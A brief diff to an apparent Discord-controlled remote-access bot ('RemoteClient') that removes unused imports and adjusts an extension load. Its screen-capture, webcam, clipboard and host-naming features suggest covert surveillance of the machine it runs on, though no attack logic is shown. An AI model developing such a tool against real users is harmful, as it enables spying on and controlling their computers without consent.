@@ -2,7 +2,6 @@ import pyperclip
 import asyncio
 import functools
 import os
-import platform
 import shutil
 import socket
 from discord.ext import commands
@@ -18,10 +17,8 @@ import ast
 import tempfile
 import aiohttp
 import discord
-import dotenv
 import pyautogui
 import requests
-import yaml
 from PIL import ImageGrab
 import cv2
 import simpleaudio
@@ -426,7 +423,7 @@ class RemoteClient(commands.Bot):
         }
 
     async def on_ready(self):
-        await self.load_extension('jishaku')
+        await self.load_extension(jishaku.__name__)
         """
         It creates a channel with the name of the hostname and username of the user that launched the
         bot.
